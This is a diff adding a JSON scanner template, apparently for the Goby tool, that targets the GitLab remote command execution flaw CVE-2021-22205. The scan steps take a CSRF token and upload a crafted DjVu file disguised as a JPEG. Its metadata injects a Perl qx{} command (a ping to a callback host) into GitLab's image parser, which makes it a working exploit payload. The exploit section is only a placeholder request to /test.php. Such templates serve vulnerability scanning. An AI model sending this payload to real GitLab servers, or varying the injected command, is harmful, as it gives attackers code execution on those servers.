@@ -1,0 +1,138 @@
+{
+      "Name": "Gitlab RCE CVE-2021-22205",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "(app=gitlab | title=\"gitlab\")",
+      "Description": "An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that were passed to a file parser which resulted in a remote command execution",
+      "Product": "gitlab",
+      "Homepage": "https://about.gitlab.com/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2021-22205"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/users/sign_in",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "experimentation_subject_id",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "X-CSRF-Token|lastbody|regex|name=\\\"csrf-token\\\" content=\\\"([\\s\\S]+?)\\\" />",
+                        "output|lastbody|text|"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/uploads/user",
+                        "follow_redirect": false,
+                        "header": {
+                              "X-CSRF-Token": "{{{X-CSRF-Token}}}",
+                              "Content-Type": "multipart/form-data; boundary=---------------------------99652559321225150602861519786",
+                              "X-Requested-With": "XMLHttpRequest"
+                        },
+                        "data_type": "text",
+                        "data": "-----------------------------99652559321225150602861519786\nContent-Disposition: form-data; name=\"file\"; filename=\"demo.jpg\"\nContent-Type: image/jpeg\n\nAT&TFORM\u0000\u0000\u0000tDJVUINFO\u0000\u0000\u0000\n\u0000\u0000\u0000\u0000\u0018\u0000,\u0001\u0016\u0001BGjp\u0000\u0000\u0000\u0000ANTa\u0000\u0000\u0000N(metadata\n\t(Copyright \"\\\n\" . qx{ping -c1 {{{check}}} } . \\\n\" b \") )\n\n-----------------------------99652559321225150602861519786--\n",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "422",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Failed to process image",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-04 16:35:47",
+      "GobyVersion": "1.8.302"
+}
